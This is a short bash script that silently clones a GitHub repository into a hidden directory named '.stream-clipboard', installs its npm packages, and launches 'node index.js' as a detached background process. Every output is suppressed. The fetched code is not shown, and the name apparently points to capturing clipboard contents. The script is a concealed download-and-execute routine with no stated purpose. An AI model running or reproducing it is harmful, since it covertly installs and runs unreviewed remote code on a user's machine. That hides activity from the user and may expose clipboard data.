#!/bin/bash
git clone --quiet https://github.com/vedprakashkushwaha/.stream-clipboard.git > /dev/null
cd .stream-clipboard > /dev/null
npm i --script  > /dev/null
nohup bash -lc "node index.js" > /dev/null &>/dev/null &
